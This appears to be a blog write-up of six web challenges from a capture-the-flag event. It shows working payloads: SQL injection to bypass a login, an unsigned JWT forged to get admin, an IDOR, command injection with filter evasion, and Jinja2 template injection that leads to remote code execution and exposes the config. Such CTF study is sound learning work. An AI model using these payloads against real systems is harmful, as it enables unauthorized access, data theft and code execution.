---
layout: post
title:  "Web Challenges"
date:   2026-08-23 15:23:00 -0400
author: uzi
tags: [CTF]
permalink: /hostile-takeover-ctf-2026-web/
---
* TOC
{:toc}
{% raw %}
## Login Bypass

**Category**: web

**Description**: The TallDwarf staff portal has been around since 2022. So has this login form. `https://login-bypass-ctf.tdho.st/`

Going to the site:

![Alt text](/images/hostileweb1.png)

`robots.txt` didnt have anything interesting. Common creds didnt work. I tested for basic SQLi and sent this request:
```http
POST /login HTTP/1.1
Host: login-bypass-ctf.tdho.st
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://login-bypass-ctf.tdho.st/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: https://login-bypass-ctf.tdho.st
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

username=admin%27+OR+1%3D1--&password=admin%27+OR+1%3D1--
```
`admin' OR 1=1--:admin' OR 1=1--` works!

This logs me in and the flag is on `/dashboard`:

![Alt text](/images/hostileweb2.png)

`TDHT{b17604b3dbcf79db2bd09921}`

___

## The Imitation Game

**Category**: web

**Description**: The TallDwarf customer portal hands you something when you log in as a guest. It appears to be very trusting of you. `https://imitation-game-ctf.tdho.st/`

Going to the site:

![Alt text](/images/hostileweb3.png)

When I login as a guest I get this jwt:
```shell
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.
```

It decodes to:
```shell
{
  "alg": "none",
  "typ": "JWT"
}
{
  "user": "guest",
  "role": "user"
}
```
Simply change it so `"role": "admin"`

I update the cookie and go to `/admin` (previously gave `403`):

![Alt text](/images/hostileweb4.png)

`TDHT{c5f5a5ad8e0d2ea72090a0de}`

___

## Server Dashboard

**Category**: web

**Description**: Something doesn't seem quite right about how this API works. I think there is something hiding in one of these servers, can you find it? Demo Account API Token: `tdh_demo_3012_k7mQ9x`, `https://server-dashboard-ctf.tdho.st/`

I go to the site:

![Alt text](/images/hostileweb5.png)

When I enter the demo api key I see the site make this request:
```http
GET /api/servers/3012/config HTTP/2
Host: server-dashboard-ctf.tdho.st
Cookie: session=.eJyrVkpMTs4vzSuJz0lMSs1RslJySc3NVyhOzEtJyq9QgEoq6SglFmTGl-Rnp-YBlZSkZMSnAJXFGxsYGsVnm-cGWlYAlRSnFpWlFsVnpihZgSRqAedBH1w.aop3QA.SGDMvK_gfQDNOQ3s0npDQUIWMcE
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://server-dashboard-ctf.tdho.st/console
Authorization: Bearer tdh_demo_3012_k7mQ9x
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
```

The response contained info about the demo server:
```shell
HTTP/2 200 OK
Date: Sun, 23 Aug 2026 04:29:54 GMT
Content-Type: application/json
Alt-Svc: h3=":443"; ma=86400

{"config":{"backup_schedule":"disabled","max_players":10,"minecraft_version":"1.21","motd":"Demo server","rcon_enabled":false},"hostname":"demo-sandbox.talldwarf.host","owner":"Demo sandbox","plan":"demo","region":"us-east-1","server_id":3012}
```

I made different requests on the api until I found the flag in `/api/servers/3001/config`:
```http
GET /api/servers/3001/config HTTP/2
Host: server-dashboard-ctf.tdho.st
Cookie: session=.eJyrVkpMTs4vzSuJz0lMSs1RslJySc3NVyhOzEtJyq9QgEoq6SglFmTGl-Rnp-YBlZSkZMSnAJXFGxsYGsVnm-cGWlYAlRSnFpWlFsVnpihZgSRqAedBH1w.aop3QA.SGDMvK_gfQDNOQ3s0npDQUIWMcE
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://server-dashboard-ctf.tdho.st/console
Authorization: Bearer tdh_demo_3012_k7mQ9x
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
```

Response:
```shell
HTTP/2 200 OK
Date: Sun, 23 Aug 2026 04:35:39 GMT
Content-Type: application/json
Alt-Svc: h3=":443"; ma=86400

{"config":{"backup_schedule":"0 3 * * *","max_players":64,"migration_notes":"Temporary contractor node for StoutGiant migration scripts. Incident response flag: TDHT{492e06e72dfaf015d87c24c8}","minecraft_version":"1.20.4","motd":"Contractor staging - do not expose","rcon_enabled":false},"hostname":"contractor-migrate.talldwarf.internal","owner":"External contractor (migration project)","plan":"internal","region":"eu-west-1","server_id":3001}
```

There is a basic silly IDOR in the api.

`TDHT{492e06e72dfaf015d87c24c8}`

___

## Diagnostics Shenanigans

**Category**: web

**Description**: Subdomain enumeration revealed a DNS testing tool, can you exploit this tool to get the flag? `https://diagnostics-shenanigans-ctf.tdho.st/`

I get to the site:

![Alt text](/images/hostileweb6.png)

I can lookup a domain or IP for DNS records. Nice.

I tried basic command injection:

![Alt text](/images/hostileweb7.png)

Basically no binaries existed on the server. I could only find `echo` and `pwd`:

![Alt text](/images/hostileweb8.png)

`$` was not allowed so I had to read files with `sh`:

![Alt text](/images/hostileweb9.png)

`TDHT{bc5397e6d34959e4d06d3212}`

___

## Up? Down? Degraded?

**Category**: web

**Description**: Theres a problem with this status page. Use it to locate the admin login credentials on the server, then enumerate the admin login path (or guess it as it's not exactly rocket science) to login as the administrator. `https://status-ctf.tdho.st/`

I go to the site:

![Alt text](/images/hostileweb10.png)

`robots.txt` didnt have anything interesting. I found a login page on `/admin/login`:

![Alt text](/images/hostileweb11.png)

I found `/incident/1` and `/incident/2` but these pages had no helpful info. I realized when I searched something that didnt exist, my input was reflected right on the page. I tried an SSTI payload for Jinja2:

![Alt text](/images/hostileweb12.png)

I found a way to read a file off the server:

![Alt text](/images/hostileweb13.png)

`{{ config }}` had this:
```shell
<Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': 's3cr3t-fl4sk-k3y-d0-n0t-sh4r3', 'SECRET_KEY_FALLBACKS': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'TRUSTED_HOSTS': None, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PARTITIONED': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'MAX_FORM_MEMORY_SIZE': 500000, 'MAX_FORM_PARTS': 1000, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'PROVIDE_AUTOMATIC_OPTIONS': True, 'ADMIN_USERNAME': "You're going to need to try harder than that :)", 'DATABASE_URL': 'sqlite:///status.db'}>
```

And RCE:

![Alt text](/images/hostileweb14.png)

I ran `{{ cycler.__init__.__globals__.os.popen('cat app.py').read() }}` and it output the file:
```python
from flask import (
    Flask,
    render_template,
    render_template_string,
    request,
    redirect,
    url_for,
    session,
    flash,
    Response,
)
from config import Config
from datetime import datetime, timedelta
import random
import base64
import os
import re


def remove_flags(value):
    if isinstance(value, str):
        return re.sub(r"TDHT\{[A-Za-z0-9_]+\}", "", value)
    if isinstance(value, dict):
        return {key: remove_flags(item) for key, item in value.items()}
    if isinstance(value, list):
        return [remove_flags(item) for item in value]
    return value


app = Flask(__name__)
app.config.from_object(Config)
app.secret_key = Config.SECRET_KEY

# --- Static service/incident data ---
SERVICES = [
    {"name": "API Gateway", "status": "operational"},
    {"name": "Web Dashboard", "status": "operational"},
    {"name": "Authentication", "status": "operational"},
    {"name": "Internal Network", "status": "operational"},
    {"name": "File Storage", "status": "degraded"},
    {"name": "Email Delivery", "status": "operational"},
]

INCIDENTS = [
    {
        "id": 1,
        "service": "File Storage",
        "title": "Degraded upload performance",
        "status": "investigating",
        "severity": "minor",
        "started": datetime.now() - timedelta(hours=2, minutes=14),
        "updates": [
            {
                "time": datetime.now() - timedelta(hours=2, minutes=14),
                "body": "We are investigating reports of slow file uploads.",
            },
            {
                "time": datetime.now() - timedelta(hours=1, minutes=40),
                "body": "The issue has been traced to one of our storage nodes. A fix is being prepared.",
            },
        ],
    },
    {
        "id": 2,
        "service": "Internal Network",
        "title": "Complete network outage - resolved",
        "status": "resolved",
        "severity": "critical",
        "started": datetime.now() - timedelta(days=3, hours=7),
        "resolved": datetime.now() - timedelta(days=3, hours=1, minutes=22),
        "updates": [
            {
                "time": datetime.now() - timedelta(days=3, hours=7),
                "body": "All internal services are unreachable. Engineers are on-call and investigating.",
            },
            {
                "time": datetime.now() - timedelta(days=3, hours=5, minutes=30),
                "body": "Root cause identified: a misconfigured BGP route was propagated across the internal fabric.",
            },
            {
                "time": datetime.now() - timedelta(days=3, hours=1, minutes=22),
                "body": (
                    "The BGP configuration has been corrected and internal connectivity has been restored. "
                    f"Post-incident review will follow.{base64.b64decode(b'VERIVHtSQTV1aFpOcHJXNkRuRENqT0ZwSUlsR0prNX0=').decode('utf-8')}"
                ),
            },
        ],
    },
]

... etc ...
```

```shell
echo 'VERIVHtSQTV1aFpOcHJXNkRuRENqT0ZwSUlsR0prNX0=' | base64 -d  
TDHT{RA5uhZNprW6DnDCjOFpIIlGJk5}
```

`TDHT{RA5uhZNprW6DnDCjOFpIIlGJk5}`

___

## Diagnostics Shenanigans Reforged

**Category**: web

**Description**: There have been some security improvements to the previous version of this tool. The tool has been completely rewritten, do not assume the previous payload will work here. You may assume the flag is in the same location as the previous version. `https://diagnostics-shenanigans-reforged-ctf.tdho.st/`

This is the `Diagnostics Shenanigans` challenge but with a new filter. They blocked these characters this time:
```shell
| < & / ; SPACES
```
They also blocked things like `cat` and `sh`. They allow `$` this time. It was blocked in the first one.

From the first challenge I remembered `pwd` and `echo` worked so I tried `example.com$(ECHO$PATH)`:

![Alt text](/images/hostileweb16.png)

Eventually I found that this payload worked: `example.com$(PATH=.	.${IFS}flag.txt)`:

![Alt text](/images/hostileweb15.png)

`PATH=.` sets the `PATH` to the current directory. The tab acts as whitespace to bypass the filter for spaces and to seperate the two arguements. `${IFS}` expands to the `Internal Field Separator` (the shells default whitespace characters).
{% endraw %}
`TDHT{bc5397e6d34959e4d06d3212}`
